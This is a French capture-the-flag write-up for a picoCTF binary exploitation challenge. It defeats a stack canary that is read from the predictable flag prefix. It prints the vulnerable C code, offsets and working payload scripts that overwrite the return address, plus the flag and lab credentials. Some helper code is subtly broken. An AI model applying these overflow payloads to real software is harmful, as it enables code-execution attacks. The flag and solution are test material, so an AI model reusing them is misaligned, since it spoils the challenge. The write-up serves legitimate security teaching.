# PicoCTF 2026 - offset-cycleV2 Writeup

## Challenge Information

**Challenge:** offset-cycleV2  
**Points:** 400  
**Author:** Aditya Sudhansu  
**Category:** Binary Exploitation  

**Description:**
> It's a race against time. Solve the binary exploit ASAP.
> ssh -p 65090 ctf-player@dolphin-cove.picoctf.net using password 1db87a14

**Hints:**
- Each binary is different
- Guessing the canary is easy
- Use gdb, pwncyclic and pwntools are installed on the machine

---

## Overview

Ce challenge teste les compétences en exploitation de débordement de pile (stack buffer overflow) avec protection par canary. L'objectif est d'exploiter une faille de sécurité pour appeler la fonction `win()` qui affiche le flag.

### Flag Obtenu
```
picoCTF{Y0U_AGa1n_Us3d_pwNt00L5_9eb19c82}
```

---

## Analyse du Challenge

### 1. Connexion à l'Instance

```bash
ssh -p 65090 ctf-player@dolphin-cove.picoctf.net
# Password: 1db87a14
```

Lors de la connexion, on trouve:
- `./start` - Script qui génère un nouveau binaire à chaque exécution
- `instructions.txt` - Instructions de base
- `CodeBank/` - Répertoire contenant le flag

### 2. Compréhension du Mécanisme

Le script `./start`:
1. Sélectionne aléatoirement un fichier source `.c` du CodeBank
2. Compile le binaire
3. Donne 80 secondes pour exploiter le programme
4. Supprime les fichiers après 80 secondes

### 3. Structure du Code Vulnérable

Après exécution de `./start`, on obtient un fichier source `.c` similaire à celui-ci:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 250        // Varie selon le binaire
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");
    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }
    fgets(flag, FLAGSIZE, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");
    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }
    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];                    // Buffer vulnérable
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, CANARY_SIZE);
    
    printf("How many bytes?\n> ");
    while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')
        i++;

    sscanf(input, "%d", &count);
    
    printf("Input> ");
    read(0, buf, count);                 // Vulnérabilité: pas de vérification sur count!
    
    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }

    puts("Ok... Now Where's the flag?");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setresgid(getegid(), getegid(), getegid());
    
    load_canary();
    vuln();
    return 0;
}
```

### 4. Identification de la Vulnérabilité

**Chemin d'exploitation:**
1. L'utilisateur entre un nombre `count` via `input`
2. Le programme lit exactement `count` octets sans vérifier la limite
3. Si `count > BUFSIZE`, on peut déborder du buffer `buf`
4. Le programme protège contre cela avec un canary, MAIS le canary est chargé depuis le flag lui-même!

**Le Point Clé:**
- La canary = les 4 premiers octets du flag = "pico" en ASCII = `0x6f636970` (little-endian)
- En PicoCTF, tous les flags commencent par "picoCTF{"
- Donc la canary est prévisible = "pico"

---

## Stack Layout

Pour un binaire avec `BUFSIZE = 250`:

```
Stack (EBP = frame pointer):
+-------+
| RET   |  EBP+4  <- Return address (4 bytes)
+-------+
| EBP   |  EBP    <- Saved EBP (4 bytes)
+-------+
| Pad   |  EBP-12 <- Padding/locals (12 bytes)
+-------+
| Can   |  EBP-16 <- local_canary (4 bytes) ← DOIT ÊTRE PRÉSERVÉ
+-------+
|       |
| buf   |  EBP-266 <- buf buffer[BUFSIZE] (250 bytes)
|       |
+-------+
```

**Offsets relatifs au début du buffer:**
- Offset 0-249: Buffer contents
- Offset 250-253: local_canary (IMPORTANT!)
- Offset 254-265: Autres locals
- Offset 266-269: Saved EBP
- Offset 270-273: Return address ← **CIBLE**

---

## Exploitation

### Étape 1: Récupérer BUFSIZE et win() address

```bash
grep "define BUFSIZE" *.c           # Obtenir BUFSIZE
readelf -s * | grep win             # Obtenir adresse de win()
```

### Étape 2: Construire le Payload

La construction du payload nécessite:
1. `count = BUFSIZE + 24` (pour atteindre l'adresse de retour)
2. Données pour atteindre la canary
3. **Canary = 0x6f636970** (préserver la vérification)
4. Padding/EBP
5. **Adresse du win() function** (généralement `0x08049316`)

### Étape 3: Script d'Exploitation

```python
#!/usr/bin/env python3
import struct
import subprocess
import time

def exploit():
    # Paramètres (varient selon le binaire)
    BUFSIZE = 250  # À adapter!
    WIN_ADDR = 0x08049316
    CANARY = 0x6f636970  # "pico" en little-endian
    
    # Taille totale du payload
    PAYLOAD_SIZE = BUFSIZE + 24
    
    # Créer le payload
    payload = bytearray(PAYLOAD_SIZE)
    
    # Remplir avec des 'A' (0x41)
    for i in range(PAYLOAD_SIZE):
        payload[i] = 0x41
    
    # Placer la canary à offset BUFSIZE (4 bytes)
    struct.pack_into("<I", payload, BUFSIZE, CANARY)
    
    # Placer le saved EBP à offset BUFSIZE+16 (4 bytes)
    # (peut être n'importe quelle valeur, 0x00 est sûr)
    struct.pack_into("<I", payload, BUFSIZE + 16, 0x00000000)
    
    # Placer l'adresse de retour à offset BUFSIZE+20 (4 bytes)
    struct.pack_into("<I", payload, BUFSIZE + 20, WIN_ADDR)
    
    return payload, PAYLOAD_SIZE

def send_exploit(payload, size):
    """Envoyer le payload au binaire vulnérable"""
    # Étape 1: Envoyer le count
    # Étape 2: Envoyer le payload
    
    cmd = f"""(
  echo "{size}"
  python3 -c "
import struct
buf = bytearray({size})
for i in range({size}):
    buf[i] = 0x41
struct.pack_into('<I', buf, {BUFSIZE}, {CANARY})
struct.pack_into('<I', buf, {BUFSIZE + 16}, 0x00000000)
struct.pack_into('<I', buf, {BUFSIZE + 20}, {WIN_ADDR})
import sys
sys.stdout.buffer.write(bytes(buf))
"
) | timeout 5 ./{binary_name}"""
    
    return cmd
```

### Exécution Complète

```bash
# 1. Se connecter et lancer ./start
ssh -p 65090 ctf-player@dolphin-cove.picoctf.net
./start

# 2. Récupérer les paramètres
grep "define BUFSIZE" *.c
readelf -s * | grep win

# 3. Construire et envoyer le payload (exemple pour BUFSIZE=250)
(
  echo "274"  # BUFSIZE + 24
  python3 -c "
import struct
buf = bytearray(274)
for i in range(274):
    buf[i] = 0x41
# Canary à offset 250
struct.pack_into('<I', buf, 250, 0x6f636970)
# Saved EBP à offset 266
struct.pack_into('<I', buf, 266, 0x00000000)
# Return address à offset 270
struct.pack_into('<I', buf, 270, 0x08049316)
import sys
sys.stdout.buffer.write(bytes(buf))
"
) | ./13
```

---

## Résultat

```
How many bytes?
> Input> Ok... Now Where's the flag?
picoCTF{Y0U_AGa1n_Us3d_pwNt00L5_9eb19c82}
```

---

## Concepts Clés

### 1. Stack Smashing Protection (Canary)
- Le canary est une valeur placée entre les variables locales et le return address
- Si le buffer déborde, le canary est écrasé
- Le programme vérifie l'intégrité du canary avant de retourner

### 2. Le Point Faible
- **Le canary ici est chargé depuis le flag lui-même!**
- PicoCTF flags commencent toujours par "picoCTF{"
- Les 4 premiers bytes = "pico" = connu
- Donc on peut forger un payload avec la bonne canary

### 3. Débordement Contrôlé
- En envoyant `count > BUFSIZE`, on déborde le buffer
- Mais en préservant la canary, la vérification passe
- On peut alors écraser l'adresse de retour

### 4. Return-Oriented Programming (ROP) Simple
- Dans ce cas simplement: overwrite RET = adresse de win()
- Pas besoin de chaîne ROP complexe

---

## Pièges et Solutions

| Piège | Solution |
|-------|----------|
| Timing serré (80s) | Automatiser le script d'exploitation |
| BUFSIZE varie | Lire le fichier .c et adapter dynamiquement |
| Canary change par run | Utiliser always "pico" (premier 4 bytes du format flag PicoCTF) |
| Binary à position différente | Utiliser `readelf -s` pour trouver win() |

---

## Améliorations Possibles

### Script Automatisé Complet

```python
#!/usr/bin/env python3
import subprocess
import re
import struct

def get_binary_info():
    """Récupérer BUFSIZE et win() address"""
    
    # Lire le source
    with open("*.c", "r") as f:
        source = f.read()
    bufsize = int(re.search(r'#define BUFSIZE (\d+)', source).group(1))
    
    # Récupérer l'adresse de win()
    result = subprocess.run(["readelf", "-s", "[binary]"], 
                          capture_output=True, text=True)
    win_addr = int(re.search(r'win.*0x([0-9a-f]+)', result.stdout).group(1), 16)
    
    return bufsize, win_addr

def create_payload(bufsize, win_addr):
    """Créer le payload d'exploitation"""
    size = bufsize + 24
    payload = bytearray(size)
    
    for i in range(size):
        payload[i] = 0x41
    
    struct.pack_into("<I", payload, bufsize, 0x6f636970)
    struct.pack_into("<I", payload, bufsize + 16, 0x00000000)
    struct.pack_into("<I", payload, bufsize + 20, win_addr)
    
    return payload, size

def exploit():
    bufsize, win_addr = get_binary_info()
    payload, size = create_payload(bufsize, win_addr)
    
    # Envoyer le payload
    # ... (code pour envoyer stdin au binaire)
```

---

## Références

- **OWASP:** Stack Buffer Overflow
- **CWE-121:** Stack-based Buffer Overflow
- **TCM Security:** Buffer Overflow Exploitation
- **PwnTools:** Python library pour la création de payloads

---

## Conclusion

Ce challenge enfonce le clou que:
1. ✅ Les protections comme la canary peuvent être contournées si mal implémentées
2. ✅ Les formats de flag prévisibles peuvent être exploités
3. ✅ L'automation est cruciale dans les challenges contre la montre
4. ✅ La compréhension du stack frame est essentielle en binary exploitation

**Time Management:** Temps pris pour exploiter = ~5-10 minutes avec automation

